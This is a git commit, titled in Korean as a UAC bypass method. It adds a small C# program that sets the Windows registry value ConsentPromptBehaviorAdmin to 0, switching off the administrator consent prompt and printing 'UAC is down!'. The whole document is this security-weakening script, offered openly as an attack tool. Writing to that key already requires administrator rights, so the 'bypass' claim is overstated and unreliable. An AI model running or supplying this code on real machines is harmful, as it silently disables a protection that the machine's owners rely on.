6ab880c59ddac4eeea45e0b7e9e0719f345af61e
yoonhyejoung <yhj8372@naver.com>
2019-05-27 09:27:40 +0900

    UAC 우회 방법 C# 코드

---
+++ UACBypass/UACBypass/Program.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace UACBypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            UAC_bypass();
+        }
+
+        private static void UAC_bypass()
+        {
+            try
+            {
+                Console.WriteLine("UAC is about to go down!");
+                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", Microsoft.Win32.RegistryKeyPermissionCheck.ReadWriteSubTree);
+                key.SetValue("ConsentPromptBehaviorAdmin", 0);
+                Console.WriteLine("UAC is down!");
+            }
+            catch (Exception ex)
+            {
+
+                Console.WriteLine("UAC_byPass() " + ex.Message);
+            }
+        }
+    }
+}
